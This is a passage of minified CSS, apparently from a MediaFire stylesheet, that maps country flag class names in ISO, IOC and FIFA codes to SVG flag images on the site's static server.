c.mediafire.com/images/flags_svg/arm.svg)}.flag-asm,.flag-as,.flag-16,.flag-ioc-asa,.flag-fifa-asa{background-image:url(//static.mediafire.com/images/flags_svg/asm.svg)}.flag-ata,.flag-aq,.flag-10,.flag-fifa-ros{background-image:url(//static.mediafire.com/images/flags_svg/ata.svg)}.flag-atf,.flag-tf,.flag-260{background-image:url(//static.mediafire.com/images/flags_svg/atf.svg)}.flag-atg,.flag-ag,.flag-28,.flag-ioc-ant,.flag-fifa-atg{background-image:url(//static.mediafire.com/images/flags_svg/atg.svg)}.flag-aus,.flag-au,.flag-36,.flag-ioc-aus,.flag-fifa-aus{background-image:url(//static.mediafire.com/images/flags_svg/aus.svg)}.flag-aut,.flag-at,.flag-40,.flag-ioc-aut,.flag-fifa-aut{background-image:url(//static.mediafire.com/images/flags_svg/aut.svg)}.flag-aze,.flag-az,.flag-31,.flag-ioc-aze,.flag-fifa-aze{background-image:url(//static.mediafire.com/images/flags_svg/aze.svg)}.flag-bdi,.flag-bi,.flag-108,.flag-ioc-bdi,.flag-fifa-bdi{background-image:url(//static.mediafire.com/images/flags_svg/bdi.svg)}.flag-bel,.flag-be,.flag-56,.flag-ioc-bel,.flag-fifa-bel{background-image:url(//static.mediafire.com/images/flags_svg/bel.svg)}.flag-ben,.flag-bj,.flag-204,.flag-ioc-ben,.flag-fifa-ben{background-image:url(//static.mediafire.com/images/flags_svg/ben.svg)}.flag-bes,.flag-bq,.flag-535,.flag-ioc-aho,.flag-fifa-ant{background-image:url(//static.mediafire.com/images/flags_svg/bes.svg)}.flag-bfa,.flag-bf,.flag-854,.flag-ioc-bur,.flag-fifa-bfa{background-image:url(//static.mediafire.com/images/flags_svg/bfa.svg)}.flag-bgd,.flag-bd,.flag-50,.flag-ioc-ban,.flag-fifa-ban{background-image:url(//static.mediafire.com/images/flags_svg/bgd.svg)}.flag-bgr,.flag-bg,.flag-100,.flag-ioc-bul,.flag-fifa-bul{background-image:url(//static.mediafire.com/images/flags_svg/bgr.svg)}.flag-bhr,.flag-bh,.flag-48,.flag-ioc-brn,.flag-fifa-bhr{background-image:url(//static.mediafire.com/images/flags_svg/bhr.svg)}.flag-bhs,.flag-bs,.flag-44,.flag-ioc-bah,.flag-fifa-bah{background-image:url(//static.mediafire.com/images/flags_svg/bhs.svg)}.flag-bih,.flag-ba,.flag-70,.flag-ioc-bih,.flag-fifa-bih{background-image:url(//static.mediafire.com/images/flags_svg/bih.svg)}.flag-blm,.flag-bl,.flag-652{background-image:url(//static.mediafire.com/images/flags_svg/blm.svg)}.flag-blr,.flag-by,.flag-112,.flag-ioc-blr,.flag-fifa-blr{background-image:url(//static.mediafire.com/images/flags_svg/blr.svg)}.flag-blz,.flag-bz,.flag-84,.flag-ioc-biz,.flag-fifa-blz{background-image:url(//static.mediafire.com/images/flags_svg/blz.svg)}.flag-bmu,.flag-bm,.flag-60,.flag-ioc-ber,.flag-fifa-ber{background-image:url(//static.mediafire.com/images/flags_svg/bmu.svg)}.flag-bol,.flag-bo,.flag-68,.flag-ioc-bol,.flag-fifa-bol{background-image:url(//static.mediafire.com/images/flags_svg/bol.svg)}.flag-bra,.flag-br,.flag-76,.flag-ioc-bra,.flag-fifa-bra{background-image:url(//static.mediafire.com/images/flags_svg/bra.svg)}.flag-brb,.flag-bb,.flag-52,.flag-ioc-bar,.flag-fifa-brb{background-image:url(//static.mediafire.com/images/flags_svg/brb.svg)}.flag-brn,.flag-bn,.flag-96,.flag-ioc-bru,.flag-fifa-bru{background-image:url(//static.mediafire.com/images/flags_svg/brn.svg)}.flag-btn,.flag-bt,.flag-64,.flag-ioc-bhu,.flag-fifa-bhu{background-image:url(//static.mediafire.com/images/flags_svg/btn.svg)}.flag-bvt,.flag-bv,.flag-74{background-image:url(//static.mediafire.com/images/flags_svg/bvt.svg)}.flag-bwa,.flag-bw,.flag-72,.flag-ioc-bot,.flag-fifa-bot{background-image:url(//static.mediafire.com/images/flags_svg/bwa.svg)}.flag-caf,.flag-cf,.flag-140,.flag-ioc-caf,.flag-fifa-cta{background-image:url(//static.mediafire.com/images/flags_svg/caf.svg)}.flag-can,.flag-ca,.flag-124,.flag-ioc-can,.flag-fifa-can{background-image:url(//static.mediafire.com/images/flags_svg/can.svg)}.flag-cck,.flag-cc,.flag-166,.flag-fifa-cck{background-image:url(//static.mediafire.com/images/flags_svg/cck.svg)}.flag-che,.flag-ch,.flag-756,.flag-ioc-sui,.flag-fifa-sui{background-image:url(//static.mediafire.com/images/flags_svg/che.svg)}.flag-chl,.flag-cl,.flag-152,.flag-ioc-chi,.flag-fifa-chi{background-image:url(//static.mediafire.com/images/flags_svg/chl.svg)}.flag-chn,.flag-cn,.flag-156,.flag-ioc-chn,.flag-fifa-chn{background-image:url(//static.mediafire.com/images/flags_svg/chn.svg)}.flag-civ,.flag-ci,.flag-384,.flag-ioc-civ,.flag-fifa-civ{background-image:url(//static.mediafire.com/images/flags_svg/civ.svg)}.flag-cmr,.flag-cm,.flag-120,.flag-ioc-cmr,.flag-fifa-cmr{background-image:url(//static.mediafire.com/images/flags_svg/cmr.svg)}.flag-cod,.flag-cd,.flag-180,.flag-ioc-cod,.flag-fifa-cod{background-image:url(//static.mediafire.com/images/flags_svg/cod.svg)}.flag-cog,.flag-cg,.flag-178,.flag-ioc-cgo,.flag-fifa-cgo{background-image:url(//static.mediafire.com/images/flags_svg/cog.svg)}.flag-cok,.flag-ck,.flag-184,.flag-ioc-cok,.flag-fifa-cok{background-image:url(//static.mediafire.com/images/flags_svg/cok.svg)}.flag-col,.flag-co,.flag-170,.flag-ioc-col,.flag-fifa-col{background-image:url(//static.mediafire.com/images/flags_svg/col.svg)}.flag-com,.flag-km,.flag-174,.flag-ioc-com,.flag-fifa-com{background-image:url(//static.mediafire.com/images/flags_svg/com.svg)}.flag-cpv,.flag-cv,.flag-132,.flag-ioc-cpv,.flag-fifa-cpv{background-image:url(//static.mediafire.com/images/flags_svg/cpv.svg)}.flag-cri,.flag-cr,.flag-188,.flag-ioc-crc,.flag-fifa-crc{background-image:url(//static.mediafire.com/images/flags_svg/cri.svg)}.flag-cub,.flag-cu,.flag-192,.flag-ioc-cub,.flag-fifa-cub{background-image:url(//static.mediafire.com/images/flags_svg/cub.svg)}.flag-cuw,.flag-cw,.flag-531{background-image:url(//static.mediafire.com/images/flags_svg/cuw.svg)}.flag-cxr,.flag-cx,.flag-162,.flag-fifa-cxr{background-image:url(//static.mediafire.com/images/flags_svg/cxr.svg)}.flag-cym,.flag-ky,.flag-136,.flag-ioc-cay,.flag-fifa-cay{background-image:url(//static.mediafire.com/images/flags_svg/cym.svg)}.flag-cyp,.flag-cy,.flag-196,.flag-ioc-cyp,.flag-fifa-cyp{background-image:url(//static.mediafire.com/images/flags_svg/cyp.svg)}.flag-cze,.flag-cz,.flag-203,.flag-ioc-cze,.flag-fifa-cze{background-image:url(//static.mediafire.com/images/flags_svg/cze.svg)}.flag-deu,.flag-de,.flag-276,.flag-ioc-ger,.flag-fifa-ger{background-image:url(//static.mediafire.com/images/flags_svg/deu.svg)}.flag-dji,.flag-dj,.flag-262,.flag-ioc-dji,.flag-fifa-dji{background-image:url(//static.mediafire.com/images/flags_svg/dji.svg)}.flag-dma,.flag-dm,.flag-212,.flag-ioc-dma,.flag-fifa-dma{background-image:url(//static.mediafire.com/images/flags_svg/dma.svg)}.flag-dnk,.flag-dk,.flag-208,.flag-ioc-den,.flag-fifa-den{background-image:url(//static.mediafire.com/images/flags_svg/dnk.svg)}.flag-dom,.flag-do,.flag-214,.flag-ioc-dom,.flag-fifa-dom{background-image:url(//static.mediafire.com/images/flags_svg/dom.svg)}.flag-dza,.flag-dz,.flag-12,.flag-ioc-alg,.flag-fifa-alg{background-image:url(//static.mediafire.com/images/flags_svg/dza.svg)}.flag-ecu,.flag-ec,.flag-218,.flag-ioc-ecu,.flag-fifa-ecu{background-image:url(//static.mediafire.com/images/flags_svg/ecu.svg)}.flag-egy,.flag-eg,.flag-818,.flag-ioc-egy,.flag-fifa-egy{background-image:url(//static.mediafire.com/images/flags_svg/egy.svg)}.flag-eri,.flag-er,.flag-232,.flag-ioc-eri,.flag-fifa-eri{background-image:url(//static.mediafire.com/images/flags_svg/eri.svg)}.flag-esh,.flag-eh,.flag-732,.flag-fifa-sah{background-image:url(//static.mediafire.com/images/flags_svg/esh.svg)}.flag-esp,.flag-es,.flag-724,.flag-ioc-esp,.flag-fifa-esp{background-image:url(//static.mediafire.com/images/flags_svg/esp.svg)}.flag-est,.flag-ee,.flag-233,.flag-ioc-est,.flag-fifa-est{background-image:url(//static.mediafire.com/images/flags_svg/est.svg)}.flag-eth,.flag-et,.flag-231,.flag-ioc-eth,.flag-fifa-eth{background-image:url(//static.mediafire.com/images/flags_svg/eth.svg)}.flag-fin,.flag-fi,.flag-246,.flag-ioc-fin,.flag-fifa-fin{background-image:url(//static.mediafire.com/images/flags_svg/fin.svg)}.flag-fji,.flag-fj,.flag-242,.flag-ioc-fij,.flag-fifa-fij{background-image:url(//static.mediafire.com/images/flags_svg/fji.svg)}.flag-flk,.flag-fk,.flag-238,.flag-ioc-flk,.flag-fifa-flk{background-image:url(//static.mediafire.com/images/flags_svg/flk.svg)}.flag-fra,.flag-fr,.flag-250,.flag-ioc-fra,.flag-fifa-fra{background-image:url(//static.mediafire.com/images/flags_svg/fra.svg)}.flag-fro,.flag-fo,.flag-234,.flag-ioc-far,.flag-fifa-fro{background-image:url(//static.mediafire.com/images/flags_svg/fro.svg)}.flag-fsm,.flag-fm,.flag-583,.flag-ioc-fsm,.flag-fifa-fsm{background-image:url(//static.mediafire.com/images/flags_svg/fsm.svg)}.flag-gab,.flag-ga,.flag-266,.flag-ioc-gab,.flag-fifa-gab{background-image:url(//static.mediafire.com/images/flags_svg/gab.svg)}.flag-gbr,.flag-gb,.flag-826,.flag-ioc-gbr{background-image:url(//static.mediafire.com/images/flags_svg/gbr.svg)}.flag-geo,.flag-ge,.flag-268,.flag-ioc-geo,.flag-fifa-geo{background-image:url(//static.mediafire.com/images/flags_svg/geo.svg)}.flag-ggy,.flag-gg,.flag-831,.flag-fifa-gbg{background-image:url(//static.mediafire.com/images/flags_svg/ggy.svg)}.flag-gha,.flag-gh,.flag-288,.flag-ioc-gha,.flag-fifa-gha{background-image:url(//static.mediafire.com/images/flags_svg/gha.svg)}.flag-gib,.flag-gi,.flag-292,.flag-ioc-gib,.flag-fifa-gbz{background-image:url(//static.mediafire.com/images/flags_svg/gib.svg)}.flag-gin,.flag-gn,.flag-324,.flag-ioc-gui,.flag-fifa-gui{background-image:url(//static.mediafire.com/images/flags_svg/gin.svg)}.flag-glp,.flag-gp,.flag-312,.flag-ioc-gud,.flag-fifa-glp{background-image:url(//static.mediafire.com/images/flags_svg/glp.svg)}.flag-gmb,.flag-gm,.flag-270,.flag-ioc-gam,.flag-fifa-gam{background-image:url(//static.mediafire.com/images/flags_svg/gmb.svg)}.flag-gnb,.flag-gw,.flag-624,.flag-ioc-gbs,.flag-fifa-gnb{background-image:url(//static.mediafire.com/images/flags_svg/gnb.svg)}.flag-gnq,.flag-gq,.flag-226,.flag-ioc-geq,.flag-fifa-eqg{background-image:url(//static.mediafire.com/images/flags_svg/gnq.svg)}.flag-grc,.flag-gr,.flag-300,.flag-ioc-gre,.flag-fifa-gre{background-image:url(//static.mediafire.com/images/flags_svg/grc.svg)}.flag-grd,.flag-gd,.flag-308,.flag-ioc-grn,.flag-fifa-grn{background-image:url(//static.mediafire.com/images/flags_svg/grd.svg)}.flag-grl,.flag-gl,.flag-304,.flag-ioc-grl,.flag-fifa-grl{background-image:url(//static.mediafire.com/images/flags_svg/grl.svg)}.flag-gtm,.flag-gt,.flag-320,.flag-ioc-gua,.flag-fifa-gua{background-image:url(//static.mediafire.com/images/flags_svg/gtm.svg)}.flag-guf,.flag-gf,.flag-254,.flag-ioc-fgu,.flag-fifa-guf{background-image:url(//static.mediafire.com/images/flags_svg/guf.svg)}.flag-gum,.flag-gu,.flag-316,.flag-ioc-gum,.flag-fifa-gum{background-image:url(//static.mediafire.com/images/flags_svg/gum.svg)}.flag-guy,.flag-gy,.flag-328,.flag-ioc-guy,.flag-fifa-guy{background-image:url(//static.mediafire.com/images/flags_svg/guy.svg)}.flag-hkg,.flag-hk,.flag-344,.flag-ioc-hkg,.flag-fifa-hkg{background-image:url(//static.mediafire.com/images/flags_svg/hkg.svg)}.flag-hmd,.flag-hm,.flag-334{background-image:url(//static.mediafire.com/images/flags_svg/hmd.svg)}.flag-hnd,.flag-hn,.flag-340,.flag-ioc-hon,.flag-fifa-hon{background-image:url(//static.mediafire.com/images/flags_svg/hnd.svg)}.flag-hrv,.flag-hr,.flag-191,.flag-ioc-cro,.flag-fifa-cro{background-image:url(//static.mediafire.com/images/flags_svg/hrv.svg)}.flag-hti,.flag-ht,.flag-332,.flag-ioc-hai,.flag-fifa-hai{background-image:url(//static.mediafire.com/images/flags_svg/hti.svg)}.flag-hun,.flag-hu,.flag-348,.flag-ioc-hun,.flag-fifa-hun{background-image:url(//static.mediafire.com/images/flags_svg/hun.svg)}.flag-idn,.flag-id,.flag-360,.flag-ioc-ina,.flag-fifa-idn{background-image:url(//static.mediafire.com/images/flags_svg/idn.svg)}.flag-imn,.flag-im,.flag-833,.flag-fifa-gbm{background-image:url(//static.mediafire.com/images/flags_svg/imn.svg)}.flag-ind,.flag-in,.flag-356,.flag-ioc-ind,.flag-fifa-ind{background-image:url(//static.mediafire.com/images/flags_svg/ind.svg)}.flag-iot,.flag-io,.flag-86{background-image:url(//static.mediafire.com/images/flags_svg/iot.svg)}.flag-irl,.flag-ie,.flag-372,.flag-ioc-irl,.flag-fifa-irl{background-image:url(//static.mediafire.com/images/flags_svg/irl.svg)}.flag-irn,.flag-ir,.flag-364,.flag-ioc-iri,.flag-fifa-irn{background-image:url(//static.mediafire.com/images/flags_svg/irn.svg)}.flag-irq,.flag-iq,.flag-368,.flag-ioc-irq,.flag-fifa-irq{background-image:url(//static.mediafire.com/images/flags_svg/irq.svg)}.flag-isl,.flag-is,.flag-352,.flag-ioc-isl,.flag-fifa-isl{background-image:url(//static.mediafire.com/images/flags_svg/isl.svg)}.flag-isr,.flag-il,.flag-376,.flag-ioc-isr,.flag-fifa-isr{background-image:url(//static.mediafire.com/images/flags_svg/isr.svg)}.flag-ita,.flag-it,.flag-380,.flag-ioc-ita,.flag-fifa-ita{background-image:url(//static.mediafire.com/images/flags_svg/ita.svg)}.flag-jam,.flag-jm,.flag-388,.flag-ioc-jam,.flag-fifa-jam{background-image:url(//static.mediafire.com/images/flags_svg/jam.svg)}.flag-jey,.flag-je,.flag-832,.flag-fifa-gbj{background-image:url(//static.mediafire.com/images/flags_svg/jey.svg)}.flag-jor,.flag-jo,.flag-400,.flag-ioc-jor,.flag-fifa-jor{background-image:url(//static.mediafire.com/images/flags_svg/jor.svg)}.flag-jpn,.flag-jp,.flag-392,.flag-ioc-jpn,.flag-fifa-jpn{background-image:url(//static.mediafire.com/images/flags_svg/jpn.svg)}.flag-kaz,.flag-kz,.flag-398,.flag-ioc-kaz,.flag-fifa-kaz{background-image:url(//static.mediafire.com/images/flags_svg/kaz.svg)}.flag-ken,.flag-ke,.flag-404,.flag-ioc-ken,.flag-fifa-ken{background-image:url(//static.mediafire.com/images/flags_svg/ken.svg)}.flag-kgz,.flag-kg,.flag-417,.flag-ioc-kgz,.flag-fifa-kgz{background-image:url(//static.mediafire.com/images/flags_svg/kgz.svg)}.flag-khm,.flag-kh,.flag-116,.flag-ioc-cam,.flag-fifa-cam{background-image:url(//static.mediafire.com/images/flags_svg/khm.svg)}.flag-kir,.flag-ki,.flag-296,.flag-ioc-kir,.flag-fifa-kir{background-image:url(//static.mediafire.com/images/flags_svg/kir.svg)}.flag-kna,.flag-kn,.flag-659,.flag-ioc-skn,.flag-fifa-skn{background-image:url(//static.mediafire.com/images/flags_svg/kna.svg)}.flag-kor,.flag-kr,.flag-410,.flag-ioc-kor,.flag-fifa-kor{background-image:url(//static.mediafire.com/images/flags_svg/kor.svg)}.flag-kwt,.flag-kw,.flag-414,.flag-ioc-kuw,.flag-fifa-kuw{background-image:url(//static.mediafire.com/images/flags_svg/kwt.svg)}.flag-lao,.flag-la,.flag-418,.flag-ioc-lao,.flag-fifa-lao{background-image:url(//static.mediafire.com/images/flags_svg/lao.svg)}.flag-lbn,.flag-lb,.flag-422,.flag-ioc-lib,.flag-fifa-lib{background-image:url(//static.mediafire.com/images/flags_svg/lbn.svg)}.flag-lbr,.flag-lr,.flag-430,.flag-ioc-lbr,.flag-fifa-lbr{background-image:url(//static.mediafire.com/images/flags_svg/lbr.svg)}.flag-lby,.flag-ly,.flag-434,.flag-ioc-lba,.flag-fifa-lby{background-image:url(//static.mediafire.com/images/flags_svg/lby.svg)}.flag-lca,.flag-lc,.flag-662,.flag-ioc-lca,.flag-fifa-lca{background-image:url(//static.mediafire.com/images/flags_svg/lca.svg)}.flag-lie,.flag-li,.flag-438,.flag-ioc-lie,.flag-fifa-lie{background-image:url(//static.mediafire.com/images/flags_svg/lie.svg)}.flag-lka,.flag-lk,.flag-144,.flag-ioc-sri,.flag-fifa-sri{background-image:url(//static.mediafire.com/images/flags_svg/lka.svg)}.flag-lso,.flag-ls,.flag-426,.flag-ioc-les,.flag-fifa-les{background-image:url(//static.mediafire.com/images/flags_svg/lso.svg)}.flag-ltu,.flag-lt,.flag-440,.flag-ioc-ltu,.flag-fifa-ltu{background-image:url(//static.mediafire.com/images/flags_svg/ltu.svg)}.flag-lux,.flag-lu,.flag-442,.flag-ioc-lux,.flag-fifa-lux{background-image:url(//static.mediafire.com/images/flags_svg/lux.svg)}.flag-lva,.flag-lv,.flag-428,.flag-ioc-lat,.flag-fifa-lva{background-image:url(//static.mediafire.com/images/flags_svg/lva.svg)}.flag-mac,.flag-mo,.flag-446,.flag-ioc-mac,.flag-fifa-mac{background-image:url(//static.mediafire.com/images/flags_svg/mac.svg)}.flag-maf,.flag-mf,.flag-663{background-image:url(//static.mediafire.com/images/flags_svg/maf.svg)}.flag-mar,.flag-ma,.flag-504,.flag-ioc-mar,.flag-fifa-mar{background-image:url(//static.mediafire.com/images/flags_svg/mar.svg)}.flag-mco,.flag-mc,.flag-492,.flag-ioc-mon,.flag-fifa-mon{background-image:url(//static.mediafire.com/images/flags_svg/mco.svg)}.flag-mda,.flag-md,.flag-498,.flag-ioc-mda,.flag-fifa-mda{background-image:url(//static.mediafire.com/images/flags_svg/mda.svg)}.flag-mdg,.flag-mg,.flag-450,.flag-ioc-mad,.flag-fifa-mad{background-image:url(//static.mediafire.com/images/flags_svg/mdg.svg)}.flag-mdv,.flag-mv,.flag-462,.flag-ioc-mdv,.flag-fifa-mdv{background-image:url(//static.mediafire.com/images/flags_svg/mdv.svg)}.flag-mex,.flag-mx,.flag-484,.flag-ioc-mex,.flag-fifa-mex{background-image:url(//static.mediafire.com/images/flags_svg/mex.svg)}.flag-mhl,.flag-mh,.flag-584,.flag-ioc-msh,.flag-fifa-mhl{background-image:url(//static.mediafire.com/images/flags_svg/mhl.svg)}.flag-mkd,.flag-mk,.flag-807,.flag-ioc-mkd,.flag-fifa-mkd{background-image:url(//static.mediafire.com/images/flags_svg/mkd.svg)}.flag-mli,.flag-ml,.flag-466,.flag-ioc-mli,.flag-fifa-mli{background-image:url(//static.mediafire.com/images/flags_svg/mli.svg)}.flag-mlt,.flag-mt,.flag-470,.flag-ioc-mlt,.flag-fifa-mlt{background-image:url(//static.mediafire.com/images/flags_svg/mlt.svg)}.flag-mmr,.flag-mm,.flag-104,.flag-ioc-mya,.flag-fifa-mya{background-image:url(//static.mediafire.com/images/flags_svg/mmr.svg)}.flag-mne,.flag-me,.flag-499,.flag-ioc-mgo,.flag-fifa-mne{background-image:url(//static.mediafire.com/images/flags_svg/mne.svg)}.flag-mng,.flag-mn,.flag-496,.flag-ioc-mgl,.flag-fifa-mng{background-image:url(//static.mediafire.com/images/flags_svg/mng.svg)}.flag-mnp,.flag-mp,.flag-580,.flag-ioc-nma,.flag-fifa-nmi{background-image:url(//static.mediafire.com/images/flags_svg/mnp.svg)}.flag-moz,.flag-mz,.flag-508,.flag-ioc-moz,.flag-fifa-moz{background-image:url(//static.mediafire.com/images/flags_svg/moz.svg)}.flag-mrt,.flag-mr,.flag-478,.flag-ioc-mtn,.flag-fifa-mtn{background-image:url(//static.mediafire.com/images/flags_svg/mrt.svg)}.flag-msr,.flag-ms,.flag-500,.flag-ioc-mnt,.flag-fifa-msr{background-image:url(//static.mediafire.com/images/flags_svg/msr.svg)}.flag-mtq,.flag-mq,.flag-474,.flag-ioc-mrt,.flag-fifa-mtq{background-image:url(//static.mediafire.com/images/flags_svg/mtq.svg)}.flag-mus,.flag-mu,.flag-480,.flag-ioc-mri,.flag-fifa-mri{background-image:url(//static.mediafire.com/images/flags_svg/mus.svg)}.flag-mwi,.flag-mw,.flag-454,.flag-ioc-maw,.flag-fifa-mwi{background-image:url(//static.mediafire.com/images/flags_svg/mwi.svg)}.flag-mys,.flag-my,.flag-458,.flag-ioc-mas,.flag-fifa-mas{background-image:url(//static.mediafire.com/images/flags_svg/mys.svg)}.flag-myt,.flag-yt,.flag-175,.flag-ioc-may,.flag-fifa-myt{background-image:url(//static.mediafire.com/images/flags_svg/myt.svg)}.flag-nam,.flag-na,.flag-516,.flag-ioc-nam,.flag-fifa-nam{background-image:url(//static.mediafire.com/images/flags_svg/nam.svg)}.flag-ncl,.flag-nc,.flag-540,.flag-ioc-ncd,.flag-fifa-ncl{background-image:url(//static.mediafire.com/images/flags_svg/ncl.svg)}.flag-ner,.flag-ne,.flag-562,.flag-ioc-nig,.flag-fifa-nig{background-image:url(//static.mediafire.com/images/flags_svg/ner.svg)}.flag-nfk,.flag-nf,.flag-574,.flag-ioc-nfi,.flag-fifa-nfk{background-image:url(//static.mediafire.com/images/flags_svg/nfk.svg)}.flag-nga,.flag-ng,.flag-566,.flag-ioc-ngr,.flag-fifa-nga{background-image:url(//static.mediafire.com/images/flags_svg/nga.svg)}.flag-nic,.flag-ni,.flag-558,.flag-ioc-nca,.flag-fifa-nca{background-image:url(//static.mediafire.com/images/flags_svg/nic.svg)}.flag-niu,.flag-nu,.flag-570,.flag-ioc-niu,.flag-fifa-niu{background-image:url(//static.mediafire.com/images/flags_svg/niu.svg)}.flag-nld,.flag-nl,.flag-528,.flag-ioc-ned,.flag-fifa-ned{background-image:url(//static.mediafire.com/images/flags_svg/nld.svg)}.flag-nor,.flag-no,.flag-578,.flag-ioc-nor,.flag-fifa-nor{background-image:url(//static.mediafire.com/images/flags_svg/nor.svg)}.flag-npl,.flag-np,.flag-524,.flag-ioc-nep,.flag-fifa-nep{background-image:url(//static.mediafire.com/images/flags_svg/npl.svg)}.flag-nru,.flag-nr,.flag-520,.flag-ioc-nru,.flag-fifa-nru{background-image:url(//static.mediafire.com/images/flags_svg/nru.svg)}.flag-nzl,.flag-nz,.flag-554,.flag-ioc-nzl,.flag-fifa-nzl{background-image:url(//static.mediafire.com/images/flags_svg/nzl.svg)}.flag-omn,.flag-om,.flag-512,.flag-ioc-oma,.flag-fifa-oma{background-image:url(//static.mediafire.com/images/flags_svg/omn.svg)}.flag-pak,.flag-pk,.flag-586,.flag-ioc-pak,.flag-fifa-pak{background-image:url(//static.mediafire.com/images/flags_svg/pak.svg)}.flag-pan,.flag-pa,.flag-591,.flag-ioc-pan,.flag-fifa-pan{background-image:url(//static.mediafire.com/images/flags_svg/pan.svg)}.flag-pcn,.flag-pn,.flag-612,.flag-fifa-pcn{background-image:url(//static.mediafire.com/images/flags_svg/pcn.svg)}.flag-per,.flag-pe,.flag-604,.flag-ioc-per,.flag-fifa-per{background-image:url(//static.mediafire.com/images/flags_svg/per.svg)}.flag-phl,.flag-ph,.flag-608,.flag-ioc-phi,.flag-fifa-phi{background-image:url(//static.mediafire.com/images/flags_svg/phl.svg)}.flag-plw,.flag-pw,.flag-585,.flag-ioc-plw,.flag-fifa-plw{background-image:url(//static.mediafire.com/images/flags_svg/plw.svg)}.flag-png,.flag-pg,.flag-598,.flag-ioc-png,.flag-fifa-png{background-image:url(//static.mediafire.com/images/flags_svg/png.svg)}.flag-pol,.flag-pl,.flag-616,.flag-ioc-pol,.flag-fifa-pol{background-image:url(//static.mediafire.com/images/flags_svg/pol.svg)}.flag-pri,.flag-pr,.flag-630,.flag-ioc-pur,.flag-fifa-pur{background-image:url(//static.mediafire.com/images/flags_svg/pri.svg)}.flag-prk,.flag-kp,.flag-408,.flag-ioc-prk,.flag-fifa-prk{background-image:url(//static.mediafire.com/images/flags_svg/prk.svg)}.flag-prt,.flag-pt,.flag-620,.flag-ioc-por,.flag-fifa-por{background-image:url(//static.mediafire.com/images/flags_svg/prt.svg)}.flag-pry,.flag-py,.flag-600,.flag-ioc-par,.flag-fifa-par{background-image:url(//static.mediafire.com/images/flags_svg/pry.svg)}.flag-pse,.flag-ps,.flag-275,.flag-ioc-ple,.flag-fifa-ple{background-image:url(//static.mediafire.com/images/flags_svg/pse.svg)}.flag-pyf,.flag-pf,.flag-258,.flag-ioc-fpo,.flag-fifa-tah2{background-image:url(//static.mediafire.com/images/flags_svg/pyf.svg)}.flag-qat,.flag-qa,.flag-634,.flag-ioc-qat,.flag-fifa-qat{background-image:url(//static.mediafire.com/images/flags_svg/qat.svg)}.flag-reu,.flag-re,.flag-638,.flag-ioc-reu,.flag-fifa-reu{background-image:url(//static.mediafire.com/images/flags_svg/reu.svg)}.flag-rou,.flag-ro,.flag-642,.flag-ioc-rou,.flag-fifa-rou{background-image:url(//static.mediafire.com/images/flags_svg/rou.svg)}.flag-rus,.flag-ru,.flag-643,.flag-ioc-rus,.flag-fifa-rus{background-image:url(//static.mediafire.com/images/flags_svg/rus.svg)}.flag-rwa,.flag-rw,.flag-646,.flag-ioc-rwa,.flag-fifa-rwa{background-image:url(//static.mediafire.com/images/flags_svg/rwa.svg)}.flag-sau,.flag-sa,.flag-682,.flag-ioc-ksa,.flag-fifa-ksa{background-image:url(//static.mediafire.com/images/flags_svg/sau.svg)}.flag-sdn,.flag-sd,.flag-729,.flag-ioc-sud,.flag-fifa-sud{background-image:url(//static.mediafire.com/images/flags_svg/sdn.svg)}.flag-sen,.flag-sn,.flag-686,.flag-ioc-sen,.flag-fifa-sen{background-image:url(//static.mediafire.com/images/flags_svg/sen.svg)}.flag-sgp,.flag-sg,.flag-702,.flag-ioc-sin,.flag-fifa-sin{background-image:url(//static.mediafire.com/images/flags_svg/sgp.svg)}.flag-sgs,.flag-gs,.flag-239{background-image:url(//static.mediafire.com/images/flags_svg/sgs.svg)}.flag-shn,.flag-sh,.flag-654,.flag-ioc-hel,.flag-fifa-shn{background-image:url(//static.mediafire.com/images/flags_svg/shn.svg)}.flag-sjm,.flag-sj,.flag-744{background-image:url(//static.mediafire.com/images/flags_svg/sjm.svg)}.flag-slb,.flag-sb,.flag-90,.flag-ioc-sol,.flag-fifa-sol{background-image:url(//static.mediafire.com/images/flags_svg/slb.svg)}.flag-sle,.flag-sl,.flag-694,.flag-ioc-sle,.flag-fifa-sle{background-image:url(//static.mediafire.com/images/flags_svg/sle.svg)}.flag-slv,.flag-sv,.flag-222,.flag-ioc-esa,.flag-fifa-slv{background-image:url(//static.mediafire.com/images/flags_svg/slv.svg)}.flag-smr,.flag-sm,.flag-674,.flag-ioc-smr,.flag-fifa-smr{background-image:url(//static.mediafire.com/images/flags_svg/smr.svg)}.flag-som,.flag-so,.flag-706,.flag-ioc-som,.flag-fifa-som{background-image:url(//static.mediafire.com/images/flags_svg/som.svg)}.flag-spm,.flag-pm,.flag-666,.flag-ioc-spm,.flag-fifa-spm{background-image:url(//static.mediafire.com/images/flags_svg/spm.svg)}.flag-srb,.flag-rs,.flag-688,.flag-ioc-srb,.flag-fifa-srb{background-image:url(//static.mediafire.com/images/flags_svg/srb.svg)}.flag-ssd,.flag-ss,.flag-728{background-image:url(//static.mediafire.com/images/flags_svg/ssd.svg)}.flag-stp,.flag-st,.flag-678,.flag-ioc-stp,.flag-fifa-stp{background-image:url(//static.mediafire.com/images/flags_svg/stp.svg)}.flag-sur,.flag-sr,.flag-740,.flag-ioc-sur,.flag-fifa-sur{background-image:url(//static.mediafire.com/images/flags_svg/sur.svg)}.flag-svk,.flag-sk,.flag-703,.flag-ioc-svk,.flag-fifa-svk{background-image:url(//static.mediafire.com/images/flags_svg/svk.svg)}.flag-svn,.flag-si,.flag-705,.flag-ioc-slo,.flag-fifa-svn{background-image:url(//static.mediafire.com/images/flags_svg/svn.svg)}.flag-swe,.flag-se,.flag-752,.flag-ioc-swe,.flag-fifa-swe{background-image:url(//static.mediafire.com/images/flags_svg/swe.svg)}.flag-swz,.flag-sz,.flag-748,.flag-ioc-swz,.flag-fifa-swz{background-image:url(//static.mediafire.com/images/flags_svg/swz.svg)}.flag-sxm,.flag-sx,.flag-534{background-image:url(//static.mediafire.com/images/flags_svg/sxm.svg)}.flag-syc,.flag-sc,.flag-690,.flag-ioc-sey,.flag-fifa-sey{background-image:url(//static.mediafire.com/images/flags_svg/syc.svg)}.flag-syr,.flag-sy,.flag-760,.flag-ioc-syr,.flag-fifa-syr{background-image:url(//static.mediafire.com/images/flags_svg/syr.svg)}.flag-tca,.flag-tc,.flag-796,.flag-ioc-tks,.flag-fifa-tca{background-image:url(//static.mediafire.com/images/flags_svg/tca.svg)}.flag-tcd,.flag-td,.flag-148,.flag-ioc-cha,.flag-fifa-cha{background-image:url(//static.mediafire.com/images/flags_svg/tcd.svg)}.flag-tgo,.flag-tg,.flag-768,.flag-ioc-tog,.flag-fifa-tog{background-image:url(//static.mediafire.com/images/flags_svg/tgo.svg)}.flag-tha,.flag-th,.flag-764,.flag-